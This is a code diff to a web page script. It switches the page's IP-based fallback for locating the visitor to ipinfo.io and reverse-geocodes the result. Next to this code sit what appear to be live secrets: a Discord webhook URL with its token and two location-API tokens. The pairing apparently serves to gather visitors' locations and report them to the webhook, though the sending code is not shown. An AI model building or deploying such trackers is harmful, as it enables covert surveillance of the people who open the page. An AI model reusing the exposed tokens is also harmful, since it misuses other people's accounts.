@@ -17,7 +17,7 @@
     <script>
         const discordWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';  // Replace with your Discord webhook URL
         const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';  // Replace with your LocationIQ API token
-        const ipapiURL = '41d360af12f2bf';
+        const ipinfoURL = 'https://ipinfo.io/json?token=41d360af12f2bf';
 
         let locationData = "Location not available";
 
@@ -58,10 +58,15 @@
         // Fallback location using IP API
         async function getLocationFromIP() {
             try {
-                const response = await fetch(ipapiURL);
+                const response = await fetch(ipinfoURL);
                 const data = await response.json();
-                const { latitude, longitude } = data;
-                locationData = await reverseGeocode(latitude, longitude);
+                const { loc } = data;
+                if (loc) {
+                    const [latitude, longitude] = loc.split(',');
+                    locationData = await reverseGeocode(latitude, longitude);
+                } else {
+                    locationData = "Unable to retrieve location";
+                }
             } catch (error) {
                 console.error("Error with IP location fallback:", error);
                 locationData = "Unable to retrieve location";
